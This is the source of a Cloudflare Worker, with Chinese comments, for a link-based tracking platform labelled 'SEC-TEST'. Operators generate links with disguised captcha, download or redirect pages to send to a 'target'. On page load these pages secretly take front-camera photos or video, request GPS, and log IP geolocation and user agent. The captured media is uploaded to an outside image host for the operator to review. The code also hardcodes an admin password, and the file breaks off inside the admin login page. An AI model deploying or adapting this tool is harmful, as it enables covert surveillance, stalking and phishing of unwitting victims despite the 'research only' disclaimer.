/**
 * 现代简约技术研究系统 - 修复编译版 & 独立后台登录
 * 仅供安全研究、靶场测试及前端权限调用学习使用
 */

const ADMIN_PASSWORD = "sakcnzz666";
const IMAGE_HOST = "tc.ilqx.dpdns.org";
const GEO_API = "https://ip.ilqx.dpdns.org/geo";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;

    // 1. 自动初始化数据库
    await initDB(env);

    // 2. 路由分发
    if (path === "/" || path === "/index.html") return renderHome();
    if (path.startsWith("/t/")) return renderTargetPage(path.split("/")[2]);

    // API 接口
    if (path === "/api/generate") return handleGenerate(request, env);
    if (path === "/api/upload") return handleUpload(request, env);
    if (path === "/api/query") return handleQuery(request, env);
    if (path === "/api/delete") return handleDelete(request, env);  // 新增删除文件接口

    // 管理后台及操作接口
    if (path === "/admin") return renderAdmin(request, env);
    if (path === "/admin/delete") return handleAdminDelete(request, env);
    if (path === "/admin/clear") return handleAdminClear(request, env);

    return new Response("Not Found", { status: 404 });
  }
};

/* ==========================================
 * 数据库初始化
 * ========================================== */
async function initDB(env) {
  await env.DB.prepare(`
    CREATE TABLE IF NOT EXISTS sys_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      target_id TEXT,
      event_type TEXT,    -- 'GENERATE', 'VISIT', 'QUERY', 'DELETE'
      ip TEXT,
      geo_info TEXT,
      device_geo TEXT,
      media_type TEXT,
      media_url TEXT,
      ua TEXT,
      status TEXT,
      is_burned INTEGER DEFAULT 0,
      is_deleted INTEGER DEFAULT 0,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `).run();

  await env.DB.prepare(`
    CREATE TABLE IF NOT EXISTS trackings (
      target_id TEXT PRIMARY KEY,
      password TEXT,
      burn_enabled INTEGER DEFAULT 0,
      file_url TEXT
    )
  `).run();

  // 兼容旧表新增字段
  try {
    await env.DB.prepare(`ALTER TABLE sys_logs ADD COLUMN is_deleted INTEGER DEFAULT 0`).run();
  } catch (e) {}
}

/* ==========================================
 * 工具函数
 * ========================================== */
async function getGeoByIp(ip) {
  try {
    const res = await fetch(`${GEO_API}?ip=${ip}`);
    return await res.text();
  } catch (e) {
    return JSON.stringify({ error: "Geo API Timeout" });
  }
}

/* ==========================================
 * 业务 API
 * ========================================== */

// 生成链接 (支持 multipart 上传文件)
async function handleGenerate(request, env) {
  if (request.method !== "POST") return new Response("Method Not Allowed", { status: 405 });
  
  const contentType = request.headers.get("content-type") || "";
  let config, file, downloadUrl = "";
  let password = null;

  // 处理 multipart/form-data (文件下载模板)
  if (contentType.includes("multipart/form-data")) {
    const formData = await request.formData();
    config = JSON.parse(formData.get("config"));
    file = formData.get("file");
    password = formData.get("password")?.trim() || null;

    if (config.template === "download" && file) {
      // 上传文件到图床
      const uploadForm = new FormData();
      uploadForm.append("file", file);
      const tcRes = await fetch(`https://${IMAGE_HOST}/upload`, { method: "POST", body: uploadForm });
      if (tcRes.ok) {
        const tcData = await tcRes.json();
        downloadUrl = `https://${IMAGE_HOST}${tcData[0].src}`;
      } else {
        return new Response(JSON.stringify({ error: "文件上传失败" }), { status: 500 });
      }
    } else if (config.template === "download" && config.redirectUrl) {
      downloadUrl = config.redirectUrl;
    }
  } else {
    // 普通 JSON 生成
    config = await request.json();
    password = config.password?.trim() || null;
  }

  const targetId = config.id;
  const ip = request.headers.get("cf-connecting-ip") || "Unknown";
  const geo = await getGeoByIp(ip);
  const ua = request.headers.get("user-agent") || "";

  // 密码唯一性校验
  try {
    const existing = await env.DB.prepare("SELECT password FROM trackings WHERE target_id = ?").bind(targetId).first();
    if (existing) {
      if (password && existing.password && existing.password !== password) {
        return new Response(JSON.stringify({ error: "此密码已被占用，请输入其它密码" }), {
          status: 409,
          headers: { "Content-Type": "application/json" }
        });
      }
      // 更新配置 (保留旧密码)
      if (password) {
        await env.DB.prepare("UPDATE trackings SET password = ?, burn_enabled = ?, file_url = ? WHERE target_id = ?")
          .bind(password, config.burn ? 1 : 0, downloadUrl, targetId).run();
      } else if (!existing.password) {
        // 无密码更新
        await env.DB.prepare("UPDATE trackings SET burn_enabled = ?, file_url = ? WHERE target_id = ?")
          .bind(config.burn ? 1 : 0, downloadUrl, targetId).run();
      }
    } else {
      // 新 ID
      await env.DB.prepare("INSERT INTO trackings (target_id, password, burn_enabled, file_url) VALUES (?,?,?,?)")
        .bind(targetId, password, config.burn ? 1 : 0, downloadUrl).run();
    }
  } catch (e) {
    return new Response(JSON.stringify({ error: "ID 配置冲突：" + e.message }), { status: 500 });
  }

  // 日志记录 GENERATE
  await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, ip, geo_info, ua, status) VALUES (?,?,?,?,?,?)")
    .bind(targetId, 'GENERATE', ip, geo, ua, 'success').run();

  // 将配置编码进链接 (不包含密码)
  const pureConfig = { ...config };
  delete pureConfig.password;
  const encoded = btoa(encodeURIComponent(JSON.stringify(pureConfig)));
  return new Response(JSON.stringify({ url: `${new URL(request.url).origin}/t/${encoded}` }), {
    headers: { "Content-Type": "application/json" }
  });
}

// 上传媒体 (目标页)
async function handleUpload(request, env) {
  try {
    const formData = await request.formData();
    const file = formData.get("file");
    const config = JSON.parse(formData.get("config"));
    const deviceGeo = formData.get("location");
    const status = formData.get("status");
    const mediaType = config.mode;
    const ua = request.headers.get("user-agent") || "Unknown";
    const ip = request.headers.get("cf-connecting-ip") || "Unknown";
    const geo = await getGeoByIp(ip);
    let fullMediaUrl = "";

    if (file && (status === "success" || status === "download")) {
      const uploadForm = new FormData();
      uploadForm.append("file", file);
      const tcRes = await fetch(`https://${IMAGE_HOST}/upload`, { method: "POST", body: uploadForm });
      if (tcRes.ok) {
        const tcData = await tcRes.json();
        fullMediaUrl = `https://${IMAGE_HOST}${tcData[0].src}`;
      }
    }

    await env.DB.prepare(`
      INSERT INTO sys_logs (target_id, event_type, ip, geo_info, device_geo, media_type, media_url, ua, status)
      VALUES (?,?,?,?,?,?,?,?,?)
    `).bind(config.id, 'VISIT', ip, geo, deviceGeo, mediaType, fullMediaUrl, ua, status).run();

    return new Response(JSON.stringify({ success: true }), { headers: { "Content-Type": "application/json" } });
  } catch (err) {
    return new Response(JSON.stringify({ error: err.message }), { status: 500 });
  }
}

// 查询接口
async function handleQuery(request, env) {
  const { searchParams } = new URL(request.url);
  const targetId = searchParams.get("id");
  const password = searchParams.get("password")?.trim() || null;
  const burnParam = searchParams.get("burn") === "true";
  const ip = request.headers.get("cf-connecting-ip") || "Unknown";
  const geo = await getGeoByIp(ip);
  const ua = request.headers.get("user-agent") || "";

  // 密码验证
  const tracking = await env.DB.prepare("SELECT password FROM trackings WHERE target_id = ?").bind(targetId).first();
  if (tracking && tracking.password) {
    if (!password || password !== tracking.password) {
      return new Response(JSON.stringify({ error: "密码错误" }), {
        status: 403,
        headers: { "Content-Type": "application/json" }
      });
    }
  }

  // 查询日志 (排除已删除)
  const { results } = await env.DB.prepare(
    "SELECT * FROM sys_logs WHERE target_id = ? AND event_type = 'VISIT' AND is_deleted = 0 ORDER BY created_at DESC"
  ).bind(targetId).all();

  // 阅后即焚仅在密码存在时启用
  const shouldBurn = burnParam && tracking && tracking.password;
  if (shouldBurn && results.length > 0) {
    await env.DB.prepare("UPDATE sys_logs SET is_burned = 1 WHERE target_id = ? AND event_type = 'VISIT'")
      .bind(targetId).run();
  }

  // 日志记录本次查询
  await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, ip, geo_info, ua, status) VALUES (?,?,?,?,?,?)")
    .bind(targetId, 'QUERY', ip, geo, ua, 'success').run();

  return new Response(JSON.stringify(results), { headers: { "Content-Type": "application/json" } });
}

// 删除媒体 (带密码)
async function handleDelete(request, env) {
  if (request.method !== "POST") return new Response("Method Not Allowed", { status: 405 });
  const data = await request.json();
  const targetId = data.id;
  const password = data.password?.trim() || null;

  const tracking = await env.DB.prepare("SELECT password FROM trackings WHERE target_id = ?").bind(targetId).first();
  if (!tracking || !tracking.password) {
    return new Response(JSON.stringify({ error: "该ID未设置密码，无法执行删除" }), {
      status: 403, headers: { "Content-Type": "application/json" }
    });
  }
  if (password !== tracking.password) {
    return new Response(JSON.stringify({ error: "密码错误" }), {
      status: 403, headers: { "Content-Type": "application/json" }
    });
  }

  const ip = request.headers.get("cf-connecting-ip") || "Unknown";
  const geo = await getGeoByIp(ip);
  const ua = request.headers.get("user-agent") || "";

  // 标记删除
  await env.DB.prepare("UPDATE sys_logs SET is_deleted = 1 WHERE target_id = ? AND event_type = 'VISIT'")
    .bind(targetId).run();

  // 记录删除事件
  await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, ip, geo_info, ua, status) VALUES (?,?,?,?,?,?)")
    .bind(targetId, 'DELETE', ip, geo, ua, 'success').run();

  return new Response(JSON.stringify({ success: true }), { headers: { "Content-Type": "application/json" } });
}

// 后台删除单条记录
async function handleAdminDelete(request, env) {
  const cookie = request.headers.get("Cookie") || "";
  if (!cookie.includes(`admin_auth=${ADMIN_PASSWORD}`)) {
    return new Response("Unauthorized", { status: 401 });
  }
  if (request.method !== "POST") return new Response("Method Not Allowed", { status: 405 });
  const data = await request.json();
  const id = data.id;
  await env.DB.prepare("DELETE FROM sys_logs WHERE id = ?").bind(id).run();
  return new Response(JSON.stringify({ ok: true }), { headers: { "Content-Type": "application/json" } });
}

// 后台清空所有日志
async function handleAdminClear(request, env) {
  const cookie = request.headers.get("Cookie") || "";
  if (!cookie.includes(`admin_auth=${ADMIN_PASSWORD}`)) {
    return new Response("Unauthorized", { status: 401 });
  }
  if (request.method !== "POST") return new Response("Method Not Allowed", { status: 405 });
  await env.DB.prepare("DELETE FROM sys_logs").run();
  await env.DB.prepare("DELETE FROM trackings").run();
  return new Response(JSON.stringify({ ok: true }), { headers: { "Content-Type": "application/json" } });
}

/* ==========================================
 * 前端 UI 渲染 (首页、目标页)
 * ========================================== */

function renderHome() {
  const html = `
  <!DOCTYPE html>
  <html lang="zh-CN">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SEC-TEST 漏洞分析平台</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
      body { background: linear-gradient(135deg, #f6f8fd 0%, #f1f5f9 100%); }
      .glass { background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.5); }
      .fade-in { animation: fadeIn 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
      @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
      input:checked + .toggle-bg { background-color: #4f46e5; }
      input:checked + .toggle-bg + .dot { transform: translateX(100%); }
      .custom-scrollbar::-webkit-scrollbar { width: 6px; }
      .custom-scrollbar::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
    </style>
  </head>
  <body class="min-h-screen text-gray-800 selection:bg-indigo-100 selection:text-indigo-900">
    <div class="max-w-4xl mx-auto p-6 pt-12">
      <div class="glass rounded-2xl p-6 mb-8 shadow-sm fade-in">
        <h1 class="text-2xl font-bold text-indigo-900 mb-4"><i class="fa-solid fa-shield-halved mr-2"></i>SEC-TEST 技术研究实验平台</h1>
        <div class="text-sm text-gray-600 space-y-2 leading-relaxed">
          <p><strong class="text-red-500">作者声明：</strong>1. 本工具仅供技术研究、学校实验、安全靶场实测及前端权限调用学习使用，<strong>绝非非法用途</strong>，否则后果自负！网站权限均由用户浏览器原生机制自愿点击允许。</p>
          <p>2. 识别ID为查看结果的唯一凭证，请妥善保管。</p>
          <p>3. 如有侵权、肖像权等问题，请联系系统管理员进行物理删除。</p>
          <p class="text-indigo-600 font-medium"><i class="fa-solid fa-circle-info mr-1"></i>注意：受iOS系统安全限制，苹果设备须使用Safari浏览器原生内核打开方可正常调用底层硬件接口。</p>
        </div>
      </div>

      <div class="grid md:grid-cols-2 gap-8">
        <div class="glass rounded-2xl p-8 shadow-lg hover:shadow-xl transition-shadow duration-300 fade-in" style="animation-delay: 0.1s;">
          <h2 class="text-xl font-bold mb-6 flex items-center"><i class="fa-solid fa-wand-magic-sparkles text-indigo-500 mr-2"></i>生成面板</h2>
          <div class="space-y-5">
            <div>
              <label class="block text-sm font-medium text-gray-700 mb-1">跟踪 ID (如QQ号)</label>
              <input id="target_id" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 outline-none transition-all">
            </div>
            <div>
              <label class="block text-sm font-medium text-gray-700 mb-1">访问密码 (可选)</label>
              <input id="target_password" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 outline-none transition-all">
            </div>
            <div class="grid grid-cols-2 gap-4">
              <div>
                <label class="block text-sm font-medium text-gray-700 mb-1">伪装模板</label>
                <select id="template" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 outline-none">
                  <option value="blank">空白加载模板</option>
                  <option value="captcha">人机验证模板</option>
                  <option value="download" selected>文件下载模板</option>
                  <option value="redirect">链接跳转模板</option>
                </select>
              </div>
              <div id="redirect_url_box" class="hidden">
                <label class="block text-sm font-medium text-gray-700 mb-1">跳转目标地址</label>
                <input id="redirect_url" type="text" placeholder="http://" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 outline-none">
              </div>
              <div id="download_file_box" class="hidden">
                <label class="block text-sm font-medium text-gray-700 mb-1">上传文件 (<5MB) 或外链</label>
                <input id="download_file" type="file" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 outline-none">
                <input id="download_url" type="text" placeholder="或者自定义外链URL" class="mt-2 w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 outline-none">
              </div>
            </div>

            <div class="flex items-center space-x-6 pt-2">
              <label class="flex items-center cursor-pointer">
                <input type="radio" name="mode" value="photo" checked class="w-4 h-4 text-indigo-600 focus:ring-indigo-500 border-gray-300">
                <span class="ml-2 text-sm text-gray-700">极速拍照</span>
              </label>
              <label class="flex items-center cursor-pointer">
                <input type="radio" name="mode" value="video" class="w-4 h-4 text-indigo-600 focus:ring-indigo-500 border-gray-300">
                <span class="ml-2 text-sm text-gray-700">录像</span>
              </label>
            </div>
            <div id="video_options" class="hidden space-y-3">
              <div>
                <label class="text-sm text-gray-700">录像时长 (1-5秒，默认3)</label>
                <input id="duration" type="number" min="1" max="5" value="3" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 outline-none">
              </div>
              <label class="flex items-center cursor-pointer">
                <div class="relative">
                  <input type="checkbox" id="adaptive_size" checked class="sr-only">
                  <div class="block bg-gray-200 w-10 h-6 rounded-full transition-colors toggle-bg"></div>
                  <div class="dot absolute left-1 top-1 bg-white w-4 h-4 rounded-full transition-transform"></div>
                </div>
                <span class="ml-3 text-sm font-medium text-gray-700">5MB 大小自适应停止</span>
              </label>
            </div>
            <div class="space-y-3 pt-2">
              <label class="flex items-center cursor-pointer">
                <div class="relative">
                  <input type="checkbox" id="need_location" class="sr-only">
                  <div class="block bg-gray-200 w-10 h-6 rounded-full transition-colors toggle-bg"></div>
                  <div class="dot absolute left-1 top-1 bg-white w-4 h-4 rounded-full transition-transform"></div>
                </div>
                <span class="ml-3 text-sm font-medium text-gray-700">同时请求精准经纬度 (GPS)</span>
              </label>
              <label class="flex items-center cursor-pointer">
                <div class="relative">
                  <input type="checkbox" id="burn_after_reading" class="sr-only">
                  <div class="block bg-gray-200 w-10 h-6 rounded-full transition-colors toggle-bg"></div>
                  <div class="dot absolute left-1 top-1 bg-white w-4 h-4 rounded-full transition-transform"></div>
                </div>
                <span class="ml-3 text-sm font-medium text-gray-700">开启阅后即焚 (需先设置密码)</span>
              </label>
            </div>
            <button onclick="generateLink()" class="w-full mt-4 bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-indigo-200 transition-all active:scale-95 flex justify-center items-center">
              <i class="fa-solid fa-link mr-2"></i> 生成专属追踪链接
            </button>
            <div id="link_result" class="hidden p-4 bg-indigo-50 border border-indigo-100 rounded-xl text-indigo-800 text-sm break-all"></div>
          </div>
        </div>

        <div class="glass rounded-2xl p-8 shadow-lg hover:shadow-xl transition-shadow duration-300 fade-in" style="animation-delay: 0.2s;">
          <h2 class="text-xl font-bold mb-6 flex items-center"><i class="fa-solid fa-magnifying-glass text-emerald-500 mr-2"></i>查询面板</h2>
          <div class="space-y-5">
            <div>
              <label class="block text-sm font-medium text-gray-700 mb-1">追踪 ID</label>
              <input id="query_id" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition-all">
            </div>
            <div>
              <label class="block text-sm font-medium text-gray-700 mb-1">访问密码 (若未设置可留空)</label>
              <input id="query_password" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition-all">
            </div>
            <button onclick="queryData()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-emerald-200 transition-all active:scale-95 flex justify-center items-center">
              <i class="fa-solid fa-database mr-2"></i> 检索返回结果
            </button>
            <div id="query_loading" class="hidden text-center py-8 text-gray-400"><i class="fa-solid fa-circle-notch fa-spin fa-2x"></i></div>
            <div id="query_result" class="space-y-4 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar"></div>
          </div>
        </div>
      </div>
    </div>

    <script>
      const templateEl = document.getElementById('template');
      const redirectBox = document.getElementById('redirect_url_box');
      const downloadBox = document.getElementById('download_file_box');
      const videoOptions = document.getElementById('video_options');
      const modeRadios = document.querySelectorAll('input[name="mode"]');
      const passwordInput = document.getElementById('target_password');
      const burnCheck = document.getElementById('burn_after_reading');

      function updateForm() {
        const tpl = templateEl.value;
        redirectBox.style.display = tpl === 'redirect' ? 'block' : 'none';
        downloadBox.style.display = tpl === 'download' ? 'block' : 'none';
        const mode = document.querySelector('input[name="mode"]:checked').value;
        videoOptions.style.display = mode === 'video' ? 'block' : 'none';
        // 阅后即焚依赖密码
        if (passwordInput.value.trim() === '') {
          burnCheck.disabled = true;
          burnCheck.checked = false;
        } else {
          burnCheck.disabled = false;
        }
      }
      templateEl.addEventListener('change', updateForm);
      modeRadios.forEach(r => r.addEventListener('change', updateForm));
      passwordInput.addEventListener('input', updateForm);
      updateForm();

      async function generateLink() {
        const id = document.getElementById('target_id').value.trim();
        if(!id) return alert('请输入追踪 ID');
        const password = passwordInput.value.trim();
        const config = {
          id,
          template: templateEl.value,
          redirectUrl: document.getElementById('redirect_url').value,
          mode: document.querySelector('input[name="mode"]:checked').value,
          duration: parseInt(document.getElementById('duration').value) || 3,
          adaptive: document.getElementById('adaptive_size').checked,
          needLocation: document.getElementById('need_location').checked,
          burn: burnCheck.checked && password !== '',
          password
        };
        const btn = event.currentTarget;
        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-2"></i>处理中...';

        const tpl = config.template;
        const hasFile = document.getElementById('download_file').files.length > 0;
        const downloadUrl = document.getElementById('download_url').value.trim();
        
        // 如果是下载模板且上传了文件，使用 multipart
        if (tpl === 'download' && (hasFile || downloadUrl)) {
          const fd = new FormData();
          fd.append('config', JSON.stringify(config));
          fd.append('password', password);
          if (hasFile) fd.append('file', document.getElementById('download_file').files[0]);
          if (downloadUrl) fd.append('redirect_url', downloadUrl);
          try {
            const res = await fetch('/api/generate', { method: 'POST', body: fd });
            const data = await res.json();
            if (data.error) return alert(data.error);
            showLink(data.url);
          } catch(e) { alert('生成失败'); }
          finally { btn.innerHTML = '<i class="fa-solid fa-link mr-2"></i> 生成专属追踪链接'; }
          return;
        }

        try {
          const res = await fetch('/api/generate', {
            method: 'POST',
            body: JSON.stringify(config),
            headers: { 'Content-Type': 'application/json' }
          });
          const data = await res.json();
          if (data.error) return alert(data.error);
          showLink(data.url);
        } catch(e) {
          alert('生成失败');
        } finally {
          btn.innerHTML = '<i class="fa-solid fa-link mr-2"></i> 生成专属追踪链接';
        }
      }

      function showLink(url) {
        const linkBox = document.getElementById('link_result');
        linkBox.innerHTML = '<div class="font-bold mb-1">复制以下链接发送给目标：</div><a href="' + url + '" target="_blank" class="underline">' + url + '</a>';
        linkBox.classList.remove('hidden');
      }

      async function queryData() {
        const id = document.getElementById('query_id').value.trim();
        if(!id) return alert('请输入追踪 ID');
        const password = document.getElementById('query_password').value.trim();
        const isBurn = burnCheck.checked;
        document.getElementById('query_loading').classList.remove('hidden');
        document.getElementById('query_result').innerHTML = '';

        try {
          const params = new URLSearchParams({ id, burn: isBurn.toString() });
          if (password) params.append('password', password);
          const res = await fetch('/api/query?' + params.toString());
          const logs = await res.json();
          if (logs.error) {
            document.getElementById('query_result').innerHTML = '<div class="text-center text-red-500 py-6">' + logs.error + '</div>';
            return;
          }
          if(logs.length === 0) {
            document.getElementById('query_result').innerHTML = '<div class="text-center text-gray-500 py-6">暂无该ID的访问数据或已被销毁。</div>';
            return;
          }

          let html = '';
          logs.forEach((log, index) => {
            let mediaHtml = '';
            if (log.status === 'denied') {
              mediaHtml = '<div class="p-4 bg-red-50 text-red-600 rounded-xl text-center font-medium border border-red-100"><i class="fa-solid fa-ban mr-2"></i>用户拒绝了多媒体权限</div>';
            } else if (log.media_url) {
              if (log.media_type === 'video') {
                mediaHtml = '<video src="' + log.media_url + '" controls class="w-full rounded-xl shadow-sm"></video>';
              } else {
                mediaHtml = '<img src="' + log.media_url + '" class="w-full rounded-xl shadow-sm">';
              }
            }
            let geoHtml = '';
            if (log.device_geo) {
              const geo = JSON.parse(log.device_geo);
              if(geo.denied) {
                geoHtml = '<div class="text-sm text-amber-600 mt-2"><i class="fa-solid fa-location-dot mr-1"></i>GPS定位：用户拒绝授权</div>';
              } else {
                geoHtml = '<div class="text-sm text-emerald-600 mt-2 font-mono"><i class="fa-solid fa-location-crosshairs mr-1"></i>精准GPS：' + geo.lat + ', ' + geo.lng + ' (精度:' + geo.accuracy + 'm)</div>';
              }
            }
            const ipInfo = log.geo_info ? JSON.parse(log.geo_info) : {};
            const flag = ipInfo.flag || '';
            const cReg = ipInfo.countryRegion || '';
            const city = ipInfo.city || '';
            const finalIpStr = ipInfo.ip ? flag + ' ' + cReg + ' ' + city + ' [' + ipInfo.ip + ']' : log.ip;
            const dateStr = new Date(log.created_at + 'Z').toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
            html += '<div class="bg-white p-4 rounded-xl border border-gray-100 shadow-sm fade-in" style="animation-delay: ' + (index * 0.1) + 's">' +
                      '<div class="flex justify-between items-center mb-3">' +
                        '<span class="text-xs font-bold px-2 py-1 bg-gray-100 rounded text-gray-600">记录 #' + log.id + '</span>' +
                        '<span class="text-xs text-gray-400"><i class="fa-regular fa-clock"></i> ' + dateStr + '</span>' +
                      '</div>' +
                      mediaHtml +
                      geoHtml +
                      '<div class="mt-3 p-3 bg-gray-50 rounded-lg text-xs text-gray-600 space-y-1">' +
                        '<div><i class="fa-solid fa-network-wired w-4"></i> ' + finalIpStr + '</div>' +
                        '<div class="truncate" title="' + log.ua + '"><i class="fa-brands fa-safari w-4"></i> ' + log.ua + '</div>' +
                      '</div>' +
                    '</div>';
          });
          // 如果已设置密码，且查询时提供了正确密码，显示删除按钮
          if (password && logs.length > 0) {
            html += '<div class="text-center mt-4"><button onclick="deleteMedia(\'' + id + '\', \'' + password + '\')" class="px-4 py-2 bg-red-100 text-red-700 rounded-lg text-sm font-medium hover:bg-red-200"><i class="fa-solid fa-trash mr-1"></i>删除所有已捕获媒体</button></div>';
          }
          document.getElementById('query_result').innerHTML = html;
        } finally {
          document.getElementById('query_loading').classList.add('hidden');
        }
      }

      async function deleteMedia(id, password) {
        if (!confirm('确定删除该 ID 下的所有媒体记录？文件链接仍保留在后台。')) return;
        const res = await fetch('/api/delete', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id, password })
        });
        const data = await res.json();
        if (data.success) {
          alert('删除成功');
          queryData(); // 刷新
        } else {
          alert('删除失败：' + (data.error || '未知错误'));
        }
      }
    </script>
  </body>
  </html>`;
  return new Response(html, { headers: { "Content-Type": "text/html" } });
}

function renderTargetPage(encodedConfig) {
  const html = `
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>系统验证</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
      body { margin:0; font-family: system-ui, -apple-system, sans-serif; background: #f8fafc; }
      .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; }
      @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
  </head>
  <body class="flex items-center justify-center min-h-screen">
    <div id="template_container" class="w-full max-w-sm p-6 text-center"></div>
    <video id="v" style="display:none" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
      const config = JSON.parse(decodeURIComponent(atob("${encodedConfig}")));
      let deviceLocation = null;

      function renderUI() {
        const container = document.getElementById('template_container');
        if (config.template === 'captcha') {
          container.innerHTML = '<div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200"><h3 class="font-bold text-gray-700 mb-4">进行人机身份验证</h3><p class="text-sm text-gray-500 mb-4">请允许浏览器相关权限以完成活体检测</p><div class="flex justify-center"><div class="loader"></div></div></div>';
        } else if (config.template === 'download') {
          container.innerHTML = '<div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200"><h3 class="font-bold text-gray-700 mb-4">文件准备就绪</h3><p class="text-sm text-gray-500 mb-4">正在为您跳转下载…</p><div class="flex justify-center"><div class="loader"></div></div></div>';
        } else {
          container.innerHTML = '<div class="flex flex-col items-center"><div class="loader mb-4"></div><div class="text-gray-500 text-sm">页面加载中，请稍候...</div></div>';
        }
      }

      async function execute() {
        renderUI();

        if (config.needLocation) {
          try {
            const pos = await new Promise((resolve, reject) => {
              navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, enableHighAccuracy: true });
            });
            deviceLocation = JSON.stringify({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy });
          } catch(e) {
            deviceLocation = JSON.stringify({ denied: true, error: e.message });
          }
        }

        // 下载模板跳过摄像头
        if (config.template === 'download') {
          await sendPayload(null, 'download');
          if (config.downloadUrl || config.redirectUrl) {
            const url = config.downloadUrl || config.redirectUrl;
            window.location.href = url.startsWith('http') ? url : 'http://' + url;
          }
          return;
        }

        try {
          const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false 
          });
          if (config.mode === 'video') {
            await captureVideo(stream);
          } else {
            await capturePhoto(stream);
          }
        } catch(e) {
          await sendPayload(null, 'denied');
        }

        if (config.template === 'redirect' && config.redirectUrl) {
          window.location.href = config.redirectUrl.startsWith('http') ? config.redirectUrl : 'http://' + config.redirectUrl;
        } else if (config.template !== 'download') {
          document.getElementById('template_container').innerHTML = '<div class="text-green-600 font-bold">✓ 验证通过</div>';
        }
      }

      async function capturePhoto(stream) {
        const v = document.getElementById('v');
        v.srcObject = stream;
        v.setAttribute('playsinline', '');
        v.muted = true;
        await v.play();
        await new Promise(resolve => {
          if (v.readyState >= 2) resolve();
          else v.addEventListener('canplay', resolve, { once: true });
        });
        await new Promise(r => setTimeout(r, 800));
        const c = document.getElementById('c');
        c.width = v.videoWidth || 640;
        c.height = v.videoHeight || 480;
        c.getContext('2d').drawImage(v, 0, 0);
        stream.getTracks().forEach(t => t.stop());
        c.toBlob(async (blob) => {
          await sendPayload(blob, 'success');
        }, 'image/jpeg', 0.6);
      }

      async function captureVideo(stream) {
        const maxDuration = (config.duration || 3) * 1000;
        const maxBytes = config.adaptive ? 5 * 1024 * 1024 : Infinity;
        return new Promise((resolve) => {
          const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
          const chunks = [];
          let totalSize = 0;
          let timer;
          recorder.ondataavailable = (e) => {
            if (e.data.size > 0) {
              chunks.push(e.data);
              totalSize += e.data.size;
              if (totalSize >= maxBytes) {
                recorder.stop();
                if (timer) clearTimeout(timer);
              }
            }
          };
          recorder.onstop = async () => {
            stream.getTracks().forEach(t => t.stop());
            const blob = new Blob(chunks, { type: 'video/webm' });
            await sendPayload(blob, 'success');
            resolve();
          };
          recorder.start(500);
          timer = setTimeout(() => {
            recorder.stop();
          }, maxDuration);
        });
      }

      async function sendPayload(blob, status) {
        const fd = new FormData();
        if(blob) fd.append('file', blob, config.mode === 'video' ? 'v.webm' : 'p.jpg');
        fd.append('config', JSON.stringify(config));
        fd.append('status', status);
        if(deviceLocation) fd.append('location', deviceLocation);
        await fetch('/api/upload', { method: 'POST', body: fd });
      }

      window.onload = () => setTimeout(execute, 100);
    </script>
  </body>
  </html>`;
  return new Response(html, { headers: { "Content-Type": "text/html" } });
}

/* ==========================================
 * 管理员后台 (含时间轴、预览、危险操作)
 * ========================================== */
function renderAdminLogin(errorMsg = "") {
  const errorHtml = errorMsg ? `<div class="mb-4 p-3 bg-red-50 text-red-600 text-sm rounded-xl border border-red-100">${errorMsg}</div>` : "";
  const html = `
  <!DOCTYPE html>
  <html lang="zh">
  <head>
    <meta charset="UTF-8">
    <title>SEC-TEST 后台登录</title>
    <script src="https://cdn.tailwindcss.com"></script>
